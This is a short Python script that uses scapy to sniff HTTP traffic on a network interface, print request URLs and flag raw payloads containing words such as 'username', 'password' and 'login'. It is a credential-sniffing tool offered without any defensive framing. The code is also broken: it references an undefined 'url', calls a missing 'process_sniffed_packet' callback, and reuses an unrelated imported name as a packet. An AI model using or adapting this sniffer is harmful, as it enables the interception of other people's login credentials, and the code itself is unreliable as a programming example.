import scapy.all as scapy
from scapy.layers import http
from ryu.lib.packet import packet


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if url.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        values = ["username", "name", "password", "login", "pass", "email", "user", "id"]
        for value in values:
            if value in load:
                print("\n\n[+] Possible(s) value(s) founds", load + "\n\n")
                break


def admin_sniffer(interface):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host
        print("[+] HTTP Request >> " + url)
